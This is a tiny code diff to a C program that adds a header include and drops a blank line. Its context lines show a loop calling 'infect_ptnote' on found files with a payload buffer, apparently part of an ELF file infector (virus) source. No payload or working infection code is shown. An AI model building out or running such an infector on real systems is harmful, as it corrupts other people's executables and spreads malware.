@@ -6,6 +6,7 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 
 int main(void) {
     /*
@@ -78,7 +79,6 @@ int main(void) {
         infect_ptnote(f->path, payload_bin_cpy, payload_size);
 #endif
         free(payload_bin_cpy);
-
 
     }
     LOG_DEBUG("found %d files.", total_file_found);
